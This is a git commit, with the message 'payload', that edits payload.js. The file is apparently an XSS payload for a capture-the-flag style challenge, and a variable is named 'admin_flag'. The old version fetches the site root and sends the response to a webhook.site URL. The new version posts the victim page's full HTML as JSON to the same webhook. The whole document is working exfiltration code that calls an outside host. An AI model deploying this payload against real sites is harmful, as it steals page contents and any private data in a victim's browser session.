b8d120a397501943dcb83fa15ff67246e68c294c
Axl <bryannicholas7@gmail.com>
2025-06-20 20:59:50 +0700

    payload

--- payload.js
+++ payload.js
@@ -1,11 +1,13 @@
 async function getNotes() {
-    const admin_flag = await fetch('/', {
-        method: 'GET',
-        });
-    const responseBody = await admin_flag.text();
-    const send = await fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6' + '?response=' + encodeURIComponent(responseBody), {
-    method: 'POST',
+    (async () => {
+    const html = document.documentElement.outerHTML;
+    await fetch("https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ html })
     });
+    })();
+
     const output = document.createElement('p');
     output.textContent = _.capitalize('cek webhook!');
     document.body.appendChild(output);
